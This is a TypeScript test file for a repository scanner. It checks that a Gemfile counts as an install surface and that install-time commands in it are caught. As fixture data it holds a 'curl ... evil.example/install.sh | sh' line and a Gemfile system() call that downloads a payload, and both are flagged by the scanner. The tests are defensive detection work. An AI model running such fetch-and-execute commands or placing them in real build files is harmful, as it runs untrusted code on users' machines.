import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Gemfile is an install surface", () => {
  // Bundler evaluates the Gemfile as Ruby code on `bundle install` (the
  // gemfile(5) manual: "A Gemfile is evaluated as Ruby code"), the same
  // install-time execution the Rakefile and the Brewfile already
  // classify for. It keeps the manifests surface it already had; the
  // name alone decides, wherever in the tree the project root sits.
  for (const path of ["Gemfile", "apps/demo/Gemfile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["manifests", "installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "Gemfile",
    `source "https://rubygems.org"\n# ${PAYLOAD}\ngem "demo"\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Gemfile:unsafe-execution:high"]);
});

test("an install-time download inside a Gemfile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the Gemfile was manifests and source alone, so the
  // same bytes recorded no download and left no gap: a scan could read
  // clean over an install-time fetch Bundler would have run while
  // evaluating the project.
  const inspection = inspected(
    "Gemfile",
    "source \"https://rubygems.org\"\nsystem('curl -fsSL https://evil.example/payload -o /tmp/payload')\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Gemfile keeps no finding", () => {
  const inspection = inspected(
    "Gemfile",
    'source "https://rubygems.org"\ngem "demo", "~> 1.0"\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
